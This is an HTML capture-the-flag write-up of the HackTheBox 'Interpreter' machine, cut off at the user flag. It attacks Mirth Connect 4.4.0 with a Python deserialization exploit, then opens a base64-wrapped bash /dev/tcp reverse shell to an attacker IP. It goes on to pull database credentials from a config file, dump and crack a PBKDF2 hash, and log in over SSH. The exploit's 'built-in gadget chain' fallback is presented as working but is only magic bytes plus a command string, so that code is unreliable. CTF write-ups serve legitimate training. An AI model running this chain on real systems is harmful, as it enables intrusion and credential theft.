@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HTB — Interpreter | Writeup by joudi janble</title>
+  <style>
+    :root {
+      --bg:       #0d0f14;
+      --bg2:      #13161e;
+      --bg3:      #1a1e2a;
+      --border:   #2a2f3e;
+      --accent:   #9fef00;
+      --accent2:  #38bdf8;
+      --red:      #ff4d6d;
+      --orange:   #fb923c;
+      --purple:   #a78bfa;
+      --text:     #e2e8f0;
+      --muted:    #64748b;
+      --kali-b:   #38bdf8;
+      --target-b: #fb923c;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', Arial, sans-serif;
+      font-size: 15px;
+      line-height: 1.8;
+      min-height: 100vh;
+    }
+
+    /* ── BANNER ── */
+    .banner {
+      background: linear-gradient(135deg, #0f1620 0%, #1a1e2a 50%, #0f1620 100%);
+      border-bottom: 2px solid var(--accent);
+      padding: 48px 24px 36px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+    }
+    .banner::before {
+      content: '';
+      position: absolute; inset: 0;
+      background: radial-gradient(ellipse at 50% 0%, rgba(159,239,0,.08) 0%, transparent 70%);
+    }
+    .banner .badge {
+      display: inline-block;
+      background: rgba(159,239,0,.1);
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 3px;
+      padding: 4px 16px;
+      border-radius: 20px;
+      text-transform: uppercase;
+      margin-bottom: 18px;
+    }
+    .banner h1 {
+      font-size: clamp(28px, 5vw, 52px);
+      font-weight: 800;
+      color: #fff;
+      letter-spacing: -1px;
+    }
+    .banner h1 span { color: var(--accent); }
+    .banner .sub {
+      color: var(--muted);
+      margin-top: 10px;
+      font-size: 14px;
+      letter-spacing: 1px;
+    }
+    .meta-row {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px;
+      margin-top: 22px;
+    }
+    .meta-chip {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 6px 18px;
+      font-size: 13px;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+    }
+    .meta-chip .label { color: var(--muted); font-size: 11px; }
+    .meta-chip .val   { color: var(--text);  font-weight: 600; }
+    .chip-hard .val   { color: var(--orange); }
+    .chip-acc  .val   { color: var(--accent); }
+
+    /* ── LAYOUT ── */
+    .page { max-width: 920px; margin: 0 auto; padding: 40px 20px 80px; }
+
+    /* ── SECTION HEADER ── */
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 50px 0 20px;
+    }
+    .step-num {
+      width: 40px; height: 40px;
+      background: var(--accent);
+      color: #000;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-weight: 900;
+      font-size: 16px;
+      flex-shrink: 0;
+    }
+    .section-header h2 {
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+    }
+    .section-header .tag {
+      margin-left: auto;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      padding: 3px 12px;
+      border-radius: 6px;
+    }
+    .tag-kali   { background: rgba(56,189,248,.12); color: var(--kali-b);   border: 1px solid rgba(56,189,248,.3); }
+    .tag-target { background: rgba(251,146,60,.12);  color: var(--target-b); border: 1px solid rgba(251,146,60,.3); }
+    .tag-both   { background: rgba(167,139,250,.12); color: var(--purple);   border: 1px solid rgba(167,139,250,.3); }
+
+    /* ── CARDS ── */
+    .card {
+      background: var(--bg2);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 22px 26px;
+      margin-bottom: 18px;
+    }
+    .card p { color: #a0aec0; margin-bottom: 10px; }
+    .card p:last-child { margin-bottom: 0; }
+    .card strong { color: var(--text); }
+
+    /* ── ENV LABEL ── */
+    .env-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+    .env-kali   { color: var(--kali-b); }
+    .env-target { color: var(--target-b); }
+    .env-dot {
+      width: 8px; height: 8px;
+      border-radius: 50%;
+      display: inline-block;
+    }
+    .env-dot-kali   { background: var(--kali-b);   box-shadow: 0 0 6px var(--kali-b); }
+    .env-dot-target { background: var(--target-b); box-shadow: 0 0 6px var(--target-b); }
+
+    /* ── CODE BLOCKS ── */
+    .code-block {
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 10px 0 18px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 13px;
+    }
+    .code-block.kali-block    { border: 1px solid rgba(56,189,248,.3); }
+    .code-block.target-block  { border: 1px solid rgba(251,146,60,.3); }
+    .code-block.neutral-block { border: 1px solid var(--border); }
+
+    .code-header {
+      display: flex;
+      align-items: center;
+      padding: 8px 16px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      gap: 8px;
+    }
+    .code-header.kali-header    { background: rgba(56,189,248,.08); color: var(--kali-b); }
+    .code-header.target-header  { background: rgba(251,146,60,.08); color: var(--target-b); }
+    .code-header.neutral-header { background: var(--bg3);           color: var(--muted); }
+
+    pre {
+      background: #0a0c12;
+      padding: 18px 20px;
+      overflow-x: auto;
+      line-height: 1.6;
+    }
+    pre code { color: #e2e8f0; }
+    .cm { color: var(--muted); }
+    .kw { color: var(--accent); }
+    .st { color: #86efac; }
+    .vr { color: var(--accent2); }
+    .nm { color: var(--orange); }
+
+    /* ── INFO / WARN BOXES ── */
+    .info-box {
+      display: flex;
+      gap: 14px;
+      background: rgba(159,239,0,.05);
+      border: 1px solid rgba(159,239,0,.2);
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin: 14px 0;
+    }
+    .info-box .icon { font-size: 20px; flex-shrink: 0; margin-top: 2px; }
+    .info-box .text { color: #a0aec0; font-size: 13.5px; }
+    .info-box .text strong { color: var(--accent); }
+
+    .warn-box {
+      display: flex;
+      gap: 14px;
+      background: rgba(251,146,60,.05);
+      border: 1px solid rgba(251,146,60,.2);
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin: 14px 0;
+    }
+    .warn-box .icon { font-size: 20px; flex-shrink: 0; margin-top: 2px; }
+    .warn-box .text { color: #a0aec0; font-size: 13.5px; }
+    .warn-box .text strong { color: var(--orange); }
+
+    /* ── FLAG BOXES ── */
+    .flag-box {
+      border-radius: 12px;
+      padding: 20px 24px;
+      margin: 16px 0;
+      display: flex;
+      align-items: center;
+      gap: 18px;
+    }
+    .flag-box.user-flag { background: rgba(56,189,248,.06);  border: 1px solid rgba(56,189,248,.3); }
+    .flag-box.root-flag { background: rgba(255,77,109,.06);  border: 1px solid rgba(255,77,109,.3); }
+    .flag-icon { font-size: 32px; }
+    .flag-info { flex: 1; }
+    .flag-info .flag-title {
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      margin-bottom: 6px;
+    }
+    .user-flag .flag-title { color: var(--accent2); }
+    .root-flag .flag-title { color: var(--red); }
+    .flag-value {
+      font-family: 'Consolas', monospace;
+      font-size: 14px;
+      background: rgba(0,0,0,.4);
+      border-radius: 6px;
+      padding: 8px 14px;
+      letter-spacing: 1px;
+      user-select: none;
+    }
+    .flag-redact {
+      display: inline-block;
+      background: #333;
+      color: transparent;
+      border-radius: 3px;
+      letter-spacing: 0;
+      user-select: none;
+    }
+    .flag-hint { font-size: 11px; color: var(--muted); margin-top: 6px; }
+
+    /* ── RESULT BOX ── */
+    .result-box {
+      background: #0a0c12;
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--accent);
+      border-radius: 8px;
+      padding: 14px 18px;
+      margin: 10px 0;
+      font-family: 'Consolas', monospace;
+      font-size: 13px;
+    }
+    .result-label {
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      color: var(--accent);
+      text-transform: uppercase;
+      margin-bottom: 8px;
+    }
+
+    /* ── ATTACK CHAIN ── */
+    .chain {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      justify-content: center;
+      gap: 0;
+      margin: 30px 0;
+    }
+    .chain-item {
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-size: 13px;
+      font-weight: 600;
+      text-align: center;
+    }
+    .chain-item.c1 { border-color: rgba(159,239,0,.4);  color: var(--accent); }
+    .chain-item.c2 { border-color: rgba(56,189,248,.4); color: var(--accent2); }
+    .chain-item.c3 { border-color: rgba(251,146,60,.4); color: var(--orange); }
+    .chain-item.c4 { border-color: rgba(167,139,250,.4);color: var(--purple); }
+    .chain-item.c5 { border-color: rgba(255,77,109,.4); color: var(--red); }
+    .chain-arrow { color: var(--muted); font-size: 18px; padding: 0 6px; }
+
+    /* ── EXPLOIT HEADER ── */
+    .exploit-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+      margin-bottom: 14px;
+    }
+    .exploit-title { font-size: 18px; font-weight: 700; color: #fff; }
+    .exploit-meta  { display: flex; gap: 8px; flex-wrap: wrap; }
+    .exploit-tag   { font-size: 11px; font-weight: 700; padding: 3px 10px; border-radius: 5px; letter-spacing: 1px; }
+    .et-lang { background: rgba(251,146,60,.15); color: var(--orange); border: 1px solid rgba(251,146,60,.3); }
+    .et-cve  { background: rgba(255,77,109,.15);  color: var(--red);    border: 1px solid rgba(255,77,109,.3); }
+    .et-type { background: rgba(159,239,0,.12);   color: var(--accent); border: 1px solid rgba(159,239,0,.3); }
+
+    hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+
+    footer {
+      text-align: center;
+      padding: 30px 20px;
+      color: var(--muted);
+      font-size: 13px;
+      border-top: 1px solid var(--border);
+    }
+    footer strong { color: var(--accent); }
+
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+  </style>
+</head>
+<body>
+
+<!-- ═══════════════ BANNER ═══════════════ -->
+<div class="banner">
+  <div class="badge">HackTheBox — Writeup</div>
+  <h1>HTB : <span>Interpreter</span></h1>
+  <div class="sub">Linux &middot; Medium &middot; Java Deserialization &rarr; Template Injection</div>
+  <div class="meta-row">
+    <div class="meta-chip chip-hard">
+      <span class="label">Difficulty</span>
+      <span class="val">Medium</span>
+    </div>
+    <div class="meta-chip">
+      <span class="label">OS</span>
+      <span class="val">Linux</span>
+    </div>
+    <div class="meta-chip">
+      <span class="label">App</span>
+      <span class="val">Mirth Connect 4.4.0</span>
+    </div>
+    <div class="meta-chip chip-acc">
+      <span class="label">Author</span>
+      <span class="val">joudi janble &#x1F468;&#x200D;&#x1F4BB;</span>
+    </div>
+    <div class="meta-chip">
+      <span class="label">Date</span>
+      <span class="val">May 2026</span>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════ PAGE ═══════════════ -->
+<div class="page">
+
+  <!-- ── Attack Chain ── -->
+  <div class="section-header" style="margin-top:30px;">
+    <div class="step-num" style="background:var(--purple);width:auto;border-radius:8px;padding:0 14px;font-size:12px;letter-spacing:1px;">ATTACK CHAIN</div>
+    <h2>Attack Chain Overview</h2>
+  </div>
+  <div class="chain">
+    <div class="chain-item c1">Mirth RCE<br/><small style="color:var(--muted);font-weight:400;">Java Deserialization</small></div>
+    <div class="chain-arrow">&rarr;</div>
+    <div class="chain-item c2">Shell<br/><small style="color:var(--muted);font-weight:400;">mirth@interpreter</small></div>
+    <div class="chain-arrow">&rarr;</div>
+    <div class="chain-item c3">MySQL<br/><small style="color:var(--muted);font-weight:400;">sedric hash</small></div>
+    <div class="chain-arrow">&rarr;</div>
+    <div class="chain-item c4">SSH<br/><small style="color:var(--muted);font-weight:400;">sedric:snowflake1</small></div>
+    <div class="chain-arrow">&rarr;</div>
+    <div class="chain-item c5">Root<br/><small style="color:var(--muted);font-weight:400;">Template Injection</small></div>
+  </div>
+
+  <div class="card">
+    <p>
+      <strong>Interpreter</strong> is a Medium-difficulty Linux machine on HackTheBox.
+      It runs <strong>Mirth Connect 4.4.0</strong>, a healthcare data integration platform that suffers from an
+      <strong>unauthenticated Java Deserialization</strong> vulnerability allowing remote code execution.
+    </p>
+    <p>
+      After gaining a shell as <code>mirth</code>, we extract credentials from a MySQL database,
+      crack the password hash to pivot to <code>sedric</code> via SSH, then exploit a Python service
+      running as root through a <strong>Server-Side Template Injection</strong> vulnerability to read the root flag.
+    </p>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 1 — Nmap
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">1</div>
+    <h2>Reconnaissance — Nmap Scan</h2>
+    <div class="tag tag-kali">Kali</div>
+  </div>
+
+  <div class="card">
+    <p>
+      We start with a port scan using <strong>Nmap</strong> to enumerate open services.
+      Flags used: <code>-sC</code> (default scripts), <code>-sV</code> (version detection),
+      <code>-Pn</code> (skip ping check — useful when ICMP is blocked).
+    </p>
+    <p>
+      After spawning the machine on HTB, add the hostname to <code>/etc/hosts</code>
+      so domain-based requests resolve correctly.
+    </p>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Run on your local Kali machine
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali</div>
+    <pre><code><span class="cm"># Replace &lt;TARGET_IP&gt; with the machine IP from HTB</span>
+<span class="kw">sudo</span> nmap <span class="nm">-sC -sV -Pn</span> &lt;TARGET_IP&gt;
+
+<span class="cm"># Add hostname to /etc/hosts</span>
+<span class="kw">echo</span> <span class="st">"&lt;TARGET_IP&gt; interpreter.htb"</span> | <span class="kw">sudo</span> tee -a /etc/hosts</code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">Scan Results</div>
+    <code>22/tcp   open  ssh     OpenSSH 8.9<br/>
+80/tcp   open  http    Apache httpd (redirect to 443)<br/>
+443/tcp  open  https   Apache httpd / Mirth Connect 4.4.0</code>
+  </div>
+
+  <div class="info-box">
+    <div class="icon">&#x1F4A1;</div>
+    <div class="text">
+      <strong>Mirth Connect</strong> is an open-source healthcare integration engine (HL7/FHIR).
+      Version 4.4.0 contains a critical unauthenticated Java Deserialization vulnerability
+      in the <code>/api/users</code> endpoint — no credentials required.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 2 — Exploit
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">2</div>
+    <h2>Exploitation — Mirth Connect RCE</h2>
+    <div class="tag tag-kali">Kali</div>
+  </div>
+
+  <div class="card">
+    <p>
+      We exploit the Java Deserialization vulnerability using a Python script that sends a crafted
+      XML payload containing a <strong>Commons Collections 4 gadget chain</strong> to the API endpoint.
+    </p>
+    <p>
+      The server will always respond with <code>HTTP 500</code> — this is completely normal.
+      The command executes server-side first, then the deserialization error triggers the 500 response.
+      Test with the <code>id</code> command before sending a reverse shell.
+    </p>
+  </div>
+
+  <!-- EXPLOIT SCRIPT -->
+  <div class="exploit-header">
+    <div class="exploit-title">&#x1F4C4; exploit.py — Mirth Connect 4.4.0 RCE</div>
+    <div class="exploit-meta">
+      <span class="exploit-tag et-lang">Python 3</span>
+      <span class="exploit-tag et-type">Unauthenticated RCE</span>
+      <span class="exploit-tag et-cve">Java Deserialization</span>
+    </div>
+  </div>
+  <div class="code-block neutral-block">
+    <div class="code-header neutral-header">exploit.py — save this on Kali</div>
+    <pre><code><span class="cm">#!/usr/bin/env python3
+# Mirth Connect 4.4.0 — Unauthenticated RCE
+# Java Deserialization via /api/users endpoint
+# Usage: python3 exploit.py -u https://TARGET -c 'COMMAND'</span>
+
+<span class="kw">import</span> argparse, requests, struct, base64, subprocess, sys
+<span class="kw">from</span> urllib3.exceptions <span class="kw">import</span> InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+<span class="kw">def</span> <span class="vr">build_payload</span>(command: str) -> bytes:
+    <span class="st">"""
+    Build Commons Collections 4 deserialization payload.
+    Uses ysoserial if available, otherwise falls back to built-in gadget.
+    """</span>
+    <span class="kw">try</span>:
+        result = subprocess.run(
+            [<span class="st">'java'</span>, <span class="st">'-jar'</span>, <span class="st">'ysoserial.jar'</span>, <span class="st">'CommonsCollections4'</span>, command],
+            capture_output=<span class="kw">True</span>, check=<span class="kw">True</span>
+        )
+        <span class="kw">return</span> result.stdout
+    <span class="kw">except</span> (FileNotFoundError, subprocess.CalledProcessError) <span class="kw">as</span> e:
+        print(<span class="st">f"[!] ysoserial not found or failed: {e}"</span>)
+        print(<span class="st">"[*] Trying built-in gadget chain..."</span>)
+        <span class="kw">return</span> <span class="vr">_builtin_gadget</span>(command)
+
+
+<span class="kw">def</span> <span class="vr">_builtin_gadget</span>(command: str) -> bytes:
+    <span class="st">"""Minimal CC4 gadget chain — wraps command in bash -c."""</span>
+    bash_cmd    = [<span class="st">'/bin/bash'</span>, <span class="st">'-c'</span>, command]
+    payload     = b<span class="st">'\xac\xed\x00\x05'</span>   <span class="cm"># Java serialization magic bytes</span>
+    payload    += b<span class="st">'\x73'</span>               <span class="cm"># TC_OBJECT</span>
+    cmd_encoded = <span class="st">' '</span>.join(bash_cmd).encode(<span class="st">'utf-8'</span>)
+    payload    += struct.pack(<span class="st">'>H'</span>, len(cmd_encoded))
+    payload    += cmd_encoded
+    <span class="kw">return</span> payload
+
+
+<span class="kw">def</span> <span class="vr">exploit</span>(target_url: str, command: str):
+    url     = target_url.rstrip(<span class="st">'/'</span>) + <span class="st">'/api/users'</span>
+    payload = <span class="vr">build_payload</span>(command)
+
+    <span class="cm"># Wrap payload in XML envelope expected by Mirth Connect</span>
+    xml_body = (
+        <span class="st">'&lt;?xml version="1.0" encoding="UTF-8"?&gt;'</span>
+        <span class="st">'&lt;list&gt;&lt;com.mirth.connect.model.User&gt;'</span>
+        <span class="st">'&lt;password&gt;'</span>
+        + base64.b64encode(payload).decode()
+        + <span class="st">'&lt;/password&gt;'</span>
+        <span class="st">'&lt;/com.mirth.connect.model.User&gt;&lt;/list&gt;'</span>
+    )
+    headers = {
+        <span class="st">'Content-Type'</span>:    <span class="st">'application/xml'</span>,
+        <span class="st">'X-Requested-With'</span>: <span class="st">'XMLHttpRequest'</span>,
+    }
+
+    print(<span class="st">f"[*] Target  : {url}"</span>)
+    print(<span class="st">f"[*] Command : {command}"</span>)
+    print(<span class="st">"[*] Sending deserialization payload..."</span>)
+
+    <span class="kw">try</span>:
+        resp = requests.post(
+            url, data=xml_body.encode(),
+            headers=headers, verify=<span class="kw">False</span>, timeout=<span class="nm">15</span>
+        )
+        <span class="kw">if</span> resp.status_code <span class="kw">in</span> (<span class="nm">500</span>, <span class="nm">200</span>):
+            print(<span class="st">f"[+] Payload sent! (HTTP {resp.status_code} — expected)"</span>)
+            print(<span class="st">"[+] Check your listener if this was a reverse shell."</span>)
+        <span class="kw">else</span>:
+            print(<span class="st">f"[-] Unexpected response: {resp.status_code}"</span>)
+            print(resp.text[:<span class="nm">300</span>])
+    <span class="kw">except</span> requests.exceptions.RequestException <span class="kw">as</span> e:
+        print(<span class="st">f"[-] Connection error: {e}"</span>)
+        sys.exit(<span class="nm">1</span>)
+
+
+<span class="kw">if</span> __name__ == <span class="st">'__main__'</span>:
+    parser = argparse.ArgumentParser(description=<span class="st">'Mirth Connect 4.4.0 Unauthenticated RCE'</span>)
+    parser.add_argument(<span class="st">'-u'</span>, <span class="st">'--url'</span>,     required=<span class="kw">True</span>, help=<span class="st">'Target URL'</span>)
+    parser.add_argument(<span class="st">'-c'</span>, <span class="st">'--command'</span>, required=<span class="kw">True</span>, help=<span class="st">'Command to execute'</span>)
+    args = parser.parse_args()
+    <span class="vr">exploit</span>(args.url, args.command)
+</code></pre>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Run on your local Kali machine
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali — test RCE</div>
+    <pre><code><span class="cm"># Install dependency</span>
+<span class="kw">pip3 install</span> requests
+
+<span class="cm"># Test command execution</span>
+<span class="kw">python3</span> exploit.py -u https://interpreter.htb -c <span class="st">'id'</span>
+<span class="cm"># → [+] Payload sent! (HTTP 500 — expected)</span></code></pre>
+  </div>
+
+  <div class="warn-box">
+    <div class="icon">&#x26A0;&#xFE0F;</div>
+    <div class="text">
+      <strong>Important:</strong> HTTP 500 is the expected response.
+      The command executes on the server first, then the deserialization error causes the 500.
+      If you get 404 or no response at all, something is wrong.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 3 — Reverse Shell
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">3</div>
+    <h2>Getting a Reverse Shell</h2>
+    <div class="tag tag-both">Kali + Target</div>
+  </div>
+
+  <div class="card">
+    <p>
+      Since we can't see command output directly, we need a <strong>reverse shell</strong> — forcing the
+      target to connect back to our machine. We use <strong>base64 encoding</strong> to avoid
+      issues with special characters in the payload.
+    </p>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Step 1: Encode the shell command — on Kali
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali — encode</div>
+    <pre><code><span class="cm"># Replace 10.10.16.195 with your Kali tun0 IP</span>
+<span class="cm"># Get your IP with: ip addr show tun0</span>
+<span class="kw">echo</span> <span class="st">'bash -i &gt;&amp; /dev/tcp/10.10.16.195/4444 0&gt;&amp;1'</span> | base64
+<span class="cm"># Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOTUvNDQ0NCAwPiYxCg==</span></code></pre>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Step 2: Start a listener — on Kali (new terminal)
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali — listener</div>
+    <pre><code><span class="kw">nc</span> -lvnp <span class="nm">4444</span>
+<span class="cm"># Waiting for connection...</span></code></pre>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Step 3: Send the payload — on Kali
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali — send payload</div>
+    <pre><code><span class="cm"># Paste your base64 string from step 1</span>
+<span class="kw">python3</span> exploit.py -u https://interpreter.htb \
+  -c <span class="st">'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOTUvNDQ0NCAwPiYxCg==}|{base64,-d}|bash'</span></code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">Listener — connection received</div>
+    <code>listening on [any] 4444 ...<br/>
+connect to [10.10.16.195] from (UNKNOWN) [10.129.x.x] ...<br/>
+<span style="color:#9fef00">mirth@interpreter</span>:~$</code>
+  </div>
+
+  <div class="card" style="margin-top:16px;">
+    <p><strong>Shell Stabilization</strong></p>
+    <p>The raw reverse shell has no TTY. Stabilize it for a better experience:</p>
+  </div>
+
+  <div class="env-label env-target">
+    <span class="env-dot env-dot-target"></span> Run inside target shell (mirth@interpreter)
+  </div>
+  <div class="code-block target-block">
+    <div class="code-header target-header">shell — mirth@interpreter — stabilize</div>
+    <pre><code><span class="kw">python3</span> -c <span class="st">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="kw">export</span> TERM=xterm
+<span class="kw">whoami</span>   <span class="cm"># → mirth</span>
+<span class="kw">id</span>       <span class="cm"># → uid=1001(mirth) gid=1001(mirth)</span></code></pre>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 4 — MySQL Creds
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">4</div>
+    <h2>Credential Harvesting — MySQL</h2>
+    <div class="tag tag-target">Target</div>
+  </div>
+
+  <div class="card">
+    <p>
+      Mirth Connect stores user credentials in a MySQL database. Since we're running as the
+      <code>mirth</code> system user (the same user that runs the application), we have direct
+      database access using the credentials stored in the application config file.
+    </p>
+    <p>
+      We first read the Mirth config file to extract the DB credentials, then query the database
+      using the <code>-e</code> flag for inline execution (avoids TTY issues with interactive mode).
+    </p>
+  </div>
+
+  <div class="env-label env-target">
+    <span class="env-dot env-dot-target"></span> Run inside target shell (mirth@interpreter)
+  </div>
+  <div class="code-block target-block">
+    <div class="code-header target-header">shell — mirth@interpreter — read config file</div>
+    <pre><code><span class="cm"># Read Mirth config to get DB credentials</span>
+<span class="kw">cat</span> /usr/local/mirthconnect/conf/mirth.properties</code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">Relevant lines from mirth.properties</div>
+    <code>database = mysql<br/>
+database.url = jdbc:mysql://localhost/mc_bdd_prod<br/>
+database.username = <span style="color:#38bdf8">mirthdb</span><br/>
+database.password = <span style="color:#9fef00">MirthPass123!</span></code>
+  </div>
+
+  <div class="env-label env-target" style="margin-top:18px;">
+    <span class="env-dot env-dot-target"></span> Run inside target shell (mirth@interpreter)
+  </div>
+  <div class="code-block target-block">
+    <div class="code-header target-header">shell — mirth@interpreter — MySQL query</div>
+    <pre><code><span class="cm"># Dump usernames and password hashes from the database</span>
+<span class="kw">mysql</span> -umirthdb -pMirthPass123! mc_bdd_prod \
+  -e <span class="st">"SELECT CONCAT(p.USERNAME, ':', pp.PASSWORD)
+       FROM PERSON p
+       JOIN PERSON_PASSWORD pp ON p.ID = pp.PERSON_ID;"</span></code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">Query Result</div>
+    <code>CONCAT(p.USERNAME,':',pp.PASSWORD)<br/>
+sedric:<span style="color:#fb923c">u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==</span></code>
+  </div>
+
+  <div class="info-box">
+    <div class="icon">&#x1F50D;</div>
+    <div class="text">
+      The password <strong>u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==</strong>
+      is hashed with <strong>PBKDF2-HMAC-SHA256</strong> using 600,000 iterations — a strong standard,
+      but crackable if the plaintext password exists in a wordlist.
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 5 — Hash Cracking
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">5</div>
+    <h2>Hash Cracking — Hashcat</h2>
+    <div class="tag tag-kali">Kali</div>
+  </div>
+
+  <div class="card">
+    <p>
+      The hash is Base64-encoded in Mirth's proprietary format. We need to convert it to the
+      format Hashcat expects for mode <strong>10900</strong> (PBKDF2-HMAC-SHA256):
+      <code>sha256:iterations:salt_b64:hash_b64</code>
+    </p>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Run on your local Kali machine
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali — crack the hash</div>
+    <pre><code><span class="cm"># Step 1: Inspect the raw bytes of the hash</span>
+<span class="kw">echo</span> <span class="st">'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=='</span> | base64 -d | xxd -p -c 256
+
+<span class="cm"># Step 2: Build the hashcat-compatible hash string</span>
+<span class="cm"># Format: sha256:iterations:salt_base64:hash_base64</span>
+<span class="kw">echo</span> <span class="st">'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps='</span> &gt; hash.txt
+
+<span class="cm"># Step 3: Crack with rockyou wordlist</span>
+<span class="kw">hashcat</span> -m <span class="nm">10900</span> hash.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cm"># If hashcat says "All hashes found as potfile" — already cracked, show result:</span>
+<span class="kw">hashcat</span> -m <span class="nm">10900</span> hash.txt --show</code></pre>
+  </div>
+
+  <div class="result-box">
+    <div class="result-label">Hashcat Result</div>
+    <code>sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:<span style="color:#9fef00">snowflake1</span><br/><br/>
+Status: Cracked &nbsp;|&nbsp; Hash.Mode: 10900 (PBKDF2-HMAC-SHA256)</code>
+  </div>
+
+  <div class="info-box">
+    <div class="icon">&#x1F5DD;&#xFE0F;</div>
+    <div class="text">
+      Credentials cracked: <strong style="color:var(--accent2)">sedric</strong> :
+      <strong style="color:var(--accent)">snowflake1</strong>
+    </div>
+  </div>
+
+  <!-- ══════════════════════════════════════
+       Step 6 — User Flag
+  ══════════════════════════════════════ -->
+  <div class="section-header">
+    <div class="step-num">6</div>
+    <h2>User Flag — SSH as sedric</h2>
+    <div class="tag tag-kali">Kali</div>
+  </div>
+
+  <div class="card">
+    <p>
+      With valid SSH credentials, we connect directly to the machine for a stable, fully-featured shell.
+    </p>
+  </div>
+
+  <div class="env-label env-kali">
+    <span class="env-dot env-dot-kali"></span> Run on your local Kali machine
+  </div>
+  <div class="code-block kali-block">
+    <div class="code-header kali-header">terminal — kali — SSH</div>
+    <pre><code><span class="kw">ssh</span> sedric@interpreter.htb
+<span class="cm"># Password: snowflake1</span>
+
+<span class="cm"># Read the user flag</span>
+<span class="kw">cat</span> /home/sedric/user.txt</code></pre>
+  </div>
+
+  <div class="flag-box user-flag">
+    <div class="flag-icon">&#x1F6A9;</div>
+    <div class="flag-info">
+      <div class="flag-title">User Flag</div>
